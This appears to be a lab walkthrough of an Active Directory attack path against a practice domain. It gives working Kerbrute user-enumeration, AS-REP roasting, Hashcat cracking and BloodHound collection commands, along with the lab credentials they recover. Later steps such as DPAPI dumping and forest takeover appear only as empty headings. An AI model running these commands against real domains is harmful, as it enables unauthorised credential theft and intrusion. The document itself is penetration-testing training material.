# Manual

## Attack path visualized

![](<../../../../.gitbook/assets/image (68).png>)

### 1. Enumerate Users

**Task: Enumerate valid domain users.**

It is possible to enumerate valid domain users by sending TGT requests to the DC. One tool which can do this is [Kerbrute](https://github.com/ropnop/kerbrute). But before we can use this tool we need a list of valid usernames. A repository with a lot of lists for these kind of things is [SecLists](https://github.com/danielmiessler/SecLists).

1. Download the required tools:

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
git clone https://github.com/danielmiessler/SecLists
```

2\. After downloading the tool and the username list, run Kerbrute against the domain `amsterdam.bank.local` and DC `10.0.0.3`. Pipe the command to `tee` to save the output to the txt file `username_enum.txt`.&#x20;

```
./kerbrute userenum -d amsterdam.bank.local --dc 10.0.0.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt | tee username_enum.txt
```

![](<../../../../.gitbook/assets/image (72).png>)

3\. To only get a list of usernames execute the following which will cut the output to only get the usernames, changes everything to lowercase and sorting for unique entries:

```
cat username_enum.txt | grep bank.local | cut -d " " -f 8- | cut -d "@" -f 1 | sed 's/./\L&/g' | sort -u > users.txt
```

```
cat users.txt                                                                                                       
administrator
bank
bob
chris
dave
david
john
mark
mike
richard
robert
steve
thomas
```

### 2. AS-REP roast

**Task: Check if any of the valid users are vulnerable to a kerberos vulnerability.**

One of the vulnerabilities which can be exploited with just a list of usernames without having access to a valid domain user already is checking if any of the users has pre-authentication enabled. If they do we can execute the AS-REP roasting attack and hopefully crack their hash and retrieve a password.

Other attacks which are possible to do is password spraying or checking if the user has an empty password. Which won't be covered in this attack path. But its possible to gain access to other users by executing these attacks in the lab.

1. We can use the `GetNPUsers.py` script from impacket to check if any of the users have this attribute set and AS-REP roast them, saving the hashes to asreproasting.txt

```
GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting.txt
```

![](<../../../../.gitbook/assets/image (9).png>)

2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash:

![](<../../../../.gitbook/assets/image (67).png>)

3\. We can crack the hash with Hashcat. I transfered the file to my host since cracking in a VM isn't really ideal, it can't use the GPU then. I always run hashcat with rockyou and the dive ruleset.

```
.\hashcat.exe -a 0 -m 18200 .\asreproasting.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
```

![](<../../../../.gitbook/assets/image (34).png>)

4\. I cracked the hash within seconds and we gained access to the domain as `Richard` with the password `Sample123`.

#### Optional:

1. After gaining access to a valid set of credentials I always like to run BloodHound immediately. I normally run the PowerShell version of the BloodHound ingestor, but since we don't have access to a machine yet and I'm not connected on my W10 VM to the lab. We can also run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) ingestor from FoxIt.

```
git clone https://github.com/fox-it/BloodHound.py
bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.local -u 'Richard' -p 'Sample123' --zip -c all
```

![](<../../../../.gitbook/assets/image (2).png>)

2\. We now can load the data into BloodHound by draggin the zip file into it and see if Richard can do anything usefull:

![](<../../../../.gitbook/assets/image (62).png>)

Richard is member of the following groups, nothing interesting there:

![](<../../../../.gitbook/assets/image (66).png>)

The attributes of the user also doesn't show anything interesting:

![](<../../../../.gitbook/assets/image (15).png>)

### 3. Access SQL Server

**Task: Check if the user can access any system or service.**



### 4. Become sysadmin

**Task: Escalate privileges to sysadmin.**



### 5. Execute commands

**Task: Get a shell.**



### 6. Privesc RBCD

**Task: Escalate privileges on the machine with a delegation attack.**



### 7. Abuse SQL Link

**Task: Enumerate SQL Links to hop across trusts.**



### 8. UNC Path injection

**Task: Perform a UNC Path injection and capture the hash of SQL Service user.**



### 9. Crack SQL account hash

**Task: Crack the hash of the SQL service user.**



### 10. ACL - Write Owner & RCBCD

**Task: Check for ACL's and get access to the system.**



### 11. Dumping DPAPI

**Task: Look for saved credentials on the machine (DPAPI).**



### 12. Privileged groups

**Task: Become domain admin by abusing the "Backup Operators" group.**



### 13. Kerberoast

**Task: Check for interesting user attributes across the trust to `bank.local`.**



### 14. Take over Foresat

**Task: Take over the `bank.local` forest.**

